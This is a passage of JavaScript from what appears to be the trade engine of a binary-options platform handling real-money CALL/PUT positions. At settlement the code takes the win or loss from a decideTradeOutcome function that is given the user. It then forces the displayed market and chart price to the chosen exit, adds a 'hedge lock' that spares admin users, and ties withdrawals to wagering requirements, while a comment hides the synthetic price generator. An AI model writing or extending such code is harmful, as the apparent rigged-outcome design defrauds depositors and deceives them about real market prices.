        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var entry = market.price;
      if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === assetId) {
        var drawnIn = Number(D6.Chart.lastClose());
        if (isFinite(drawnIn) && drawnIn > 0) entry = drawnIn;
      }
      market.price = entry;
      if (liveBuf) {
        liveBuf.price = entry;
        if (liveBuf.forming) {
          liveBuf.forming.c = entry;
          var wEntry = entry * 0.00015;
          liveBuf.forming.h = Math.max(entry, liveBuf.forming.o || entry) + wEntry;
          liveBuf.forming.l = Math.min(entry, liveBuf.forming.o || entry) - wEntry;
        }
      }
      var wall = Date.now();
      var durationMs = duration * 1000;
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: mode,
        userId: user.id,
        seq: orderSeq,
        settled: false,
        status: 'open'
      };
      t.ticket = Object.freeze({
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        payout: payout,
        side: side,
        entryPrice: entry,
        assetId: assetId
      });
      trades.push(t);
      armTradeTimer(t);

      if (mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
        user.totalWageredSinceDeposit = Number(user.realStakeVolume) || 0;
        user.requiredWagering = D6.roundMoney((Number(user.realDepositTotal) || 0) * ((C.WAGER_MULTIPLIER) || 2));
        var need = Number(user.wagerNeed) || 0;
        if (need > 0.009) {
          need = D6.roundMoney(Math.max(0, need - stake));
          user.wagerNeed = need;
          if (need <= 0.009) {
            user.wagerNeed = 0;
            user.wagerLock = 0;
          }
        }
      }
      user.lastStake = stake;
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
      var pub = publicTrade(t);
      // Ligne CALL/PUT immédiate (sync) — ne pas attendre le prochain tick/F5.
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        try { D6.Chart.applyOpenTradeVisual(pub); } catch (eVis) { /* ignore */ }
      }
      return { ok: true, trade: pub };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (isOpen(trades[i]) && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      clearTradeTimer(trade.id);
      if (trade.settled || trade.status === 'won' || trade.status === 'lost' || trade.status === 'void') {
        trades.splice(idx, 1);
        persistOpen(user);
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (e0) { /* ignore */ }
        }
        return null;
      }
      if (now < expiryOf(trade)) return null;

      // Idempotence : marquer avant crédit.
      trade.settled = true;

      if (user.id !== trade.userId) {
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (eGone) { /* ignore */ }
        }
        trades.splice(idx, 1);
        persistOpen(user);
        return null;
      }

      var mode = trade.mode === 'real' ? 'real' : 'demo';
      var payout = normalizeOdds(trade.ticket && trade.ticket.payout != null ? trade.ticket.payout : trade.payout);
      ensureMarkets();
      var mkt = markets[trade.assetId];
      if (mkt && C.ASSETS[trade.assetId]) {
        syncMarket(mkt, C.ASSETS[trade.assetId], Date.now());
      }
      trade.payout = payout;
      var entryPx = Number(trade.ticket && trade.ticket.entryPrice != null ? trade.ticket.entryPrice : trade.entryPrice);
      var decided = decideTradeOutcome(user, trade, mode);
      var exitPrice = Number(decided.target);
      if (!(exitPrice > 0) || !isFinite(exitPrice)) exitPrice = entryPx;
      if (StochasticCore && StochasticCore.round2) {
        entryPx = StochasticCore.round2(entryPx);
        exitPrice = StochasticCore.round2(exitPrice);
      }
      var voided = !!decided.voided;
      var won = !voided && !!decided.wantWon;
      if (mode === 'real' && !isAdminUser(user) && won && hasOppositeHedge(trade)) {
        won = applyHedgeLock(trade, true);
      } else if (mode === 'real' && !isAdminUser(user) && won) {
        applyHedgeLock(trade, true);
      }
      if (mode !== 'real' && won && hasOppositeHedge(trade)) {
        won = applyHedgeLock(trade, true);
      } else if (mode !== 'real' && won) {
        applyHedgeLock(trade, true);
      }
      applyExitToMarket(trade, exitPrice);
      if (D6.Chart && D6.Chart.removeTradeVisual) {
        try { D6.Chart.removeTradeVisual(trade.id); } catch (e1) { /* ignore */ }
      }

      var payoutAmount = 0;
      var net = 0;
      var status = 'lost';

      if (voided) {
        status = 'void';
        payoutAmount = trade.stake;
        setBal(user, mode, balOf(user, mode) + trade.stake);
        net = 0;
        D6.Store.addTransaction(user, {
          type: 'void',
          amount: trade.stake,
          mode: mode,
          note: 'Égalité — mise rendue ' + C.ASSETS[trade.assetId].short
        });
      } else if (won) {
        status = 'won';
        var payoutPct = payoutPercent(payout);
        var netProfit = D6.roundMoney(trade.stake * (payoutPct / 100));
        payoutAmount = D6.roundMoney(trade.stake + netProfit);
        setBal(user, mode, balOf(user, mode) + payoutAmount);
        net = netProfit;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          mode: mode,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        status = 'lost';
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          mode: mode,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      trade.status = status;
      trade.closePrice = exitPrice;
      trade.exitPrice = exitPrice;
      user.lastStake = trade.stake;

      user.trades = (user.trades || 0) + 1;
      if (mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: mode, voided: voided });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: (trade.ticket && trade.ticket.side) || trade.side,
        stake: (trade.ticket && trade.ticket.stake != null) ? trade.ticket.stake : trade.stake,
        payout: (trade.ticket && trade.ticket.payout != null) ? trade.ticket.payout : trade.payout,
        entryPrice: (trade.ticket && trade.ticket.entryPrice != null) ? trade.ticket.entryPrice : trade.entryPrice,
        duration: (trade.ticket && trade.ticket.duration != null) ? trade.ticket.duration : trade.duration,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        won: won,
        voided: voided,
        status: status,
        net: net,
        mode: mode,
        accountType: mode
      };
      D6.Store.addPosition(user, position);
      trades.splice(idx, 1);
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) {
        D6.Supabase.saveOrder({
          id: trade.id,
          assetId: trade.assetId,
          side: trade.side,
          stake: trade.stake,
          duration: trade.duration,
          mode: mode,
          payout: trade.payout,
          entryPrice: trade.entryPrice,
          exitPrice: exitPrice,
          won: won,
          voided: voided,
          status: status,
          net: net
        }, 'closed');
      }

      try {
        document.dispatchEvent(new CustomEvent('orolado-trade-settled', {
          detail: { isWin: won, voided: voided, payout: payoutAmount, net: net, tradeId: trade.id }
        }));
      } catch (e) { /* ignore */ }

      var closed = publicTrade(trade);
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return {
        trade: closed,
        position: position,
        won: won,
        voided: voided,
        net: net,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        status: status
      };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (isOpen(trades[i]) && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) { /* ignore */ }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER, user && user.mode);
      return probe.cap;
    }
  };

  // Pas d’API publique nextPrice / seed / bougies futures.
  D6.Synth = {};

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(typeof window !== 'undefined' ? window : (typeof globalThis !== 'undefined' ? globalThis : this));
